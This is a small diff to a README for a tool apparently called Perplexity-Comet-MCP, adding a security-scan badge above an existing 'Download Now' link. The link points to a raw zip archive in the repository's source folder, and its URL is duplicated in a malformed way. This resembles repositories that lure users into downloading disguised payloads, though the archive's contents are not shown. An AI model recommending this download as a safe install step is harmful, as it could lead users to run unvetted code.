@@ -1,5 +1,7 @@
 # 🌌 Perplexity-Comet-MCP - Effortless Web Browsing and Research
 
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/thomasneatbiggers-perplexity-comet-mcp)
+
 [![Download Now](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip%https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)](https://github.com/Thomasneatbiggers/Perplexity-Comet-MCP/raw/refs/heads/main/src/Perplexity_MCP_Comet_v2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
